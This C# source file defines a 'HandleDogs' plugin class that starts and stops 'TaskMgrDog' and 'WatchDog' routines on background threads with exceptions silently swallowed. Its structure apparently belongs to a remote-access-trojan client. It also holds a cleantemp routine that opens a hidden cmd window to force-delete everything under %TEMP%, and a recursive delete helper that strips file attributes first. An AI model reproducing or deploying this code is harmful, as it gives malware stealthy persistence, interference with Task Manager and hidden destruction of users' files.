using Client.Helper;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Plugin.Handle
{
    class HandleDogs
    {
        public void TaskMgrDogStart()
        {
            new Thread(() =>
            {


                try
                {

                    TaskMgrDog.TaskMgrDogStart();

                }
                catch
                {

                }



            }).Start();
        }
        public void TaskMgrDogStop()
        {
            new Thread(() =>
            {


                try
                {

                    TaskMgrDog.TaskMgrDogStop();

                }
                catch
                {

                }



            }).Start();
            cleantemp();
        }
        public void WatchDogStart()
        {
            new Thread(() =>
            {


                try
                {

                    WatchDog.WatchDogStart();

                }
                catch
                {

                }



            }).Start();
        }

        public void WatchDogStop()
        {
            new Thread(() =>
            {


                try
                {

                    WatchDog.WatchDogStop();

                }
                catch
                {
                    
                }



            }).Start();

            cleantemp();
        }

        public static void DeleteDirectory(string target_dir)
        {
            string[] files = Directory.GetFiles(target_dir);
            string[] dirs = Directory.GetDirectories(target_dir);

            foreach (string file in files)
            {
                File.SetAttributes(file, FileAttributes.Normal);
                File.Delete(file);
            }

            foreach (string dir in dirs)
            {
                DeleteDirectory(dir);
            }

            Directory.Delete(target_dir, false);
        }

        public static void cleantemp()
        {

            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd",
                Arguments = $"/k start /b del /q/f/s %TEMP%\\* & exit",
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                UseShellExecute = true,
                ErrorDialog = false,
            });

        }


    }
}
